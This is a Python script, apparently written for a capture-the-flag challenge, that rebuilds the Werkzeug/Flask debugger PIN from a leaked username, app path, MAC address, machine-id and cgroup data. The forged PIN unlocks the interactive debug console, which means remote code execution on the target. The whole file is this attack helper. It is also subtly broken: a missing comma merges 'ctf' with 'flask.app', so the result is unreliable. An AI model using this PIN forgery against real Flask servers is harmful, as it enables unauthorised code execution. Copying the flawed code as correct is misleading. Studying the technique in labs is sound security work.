import hashlib
from itertools import chain
import uuid
def get_pin():
    probably_public_bits = [
        'ctf'# username  /proc/self/environ
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
    uuid1 = str(uuid.getnode())
    linux = b""

        # machine-id is stable across boots, boot_id is not.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except OSError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except OSError:
        pass
    linux = linux.decode('utf-8')
    private_bits = [
        uuid1,
        linux,
    ]
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv=None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv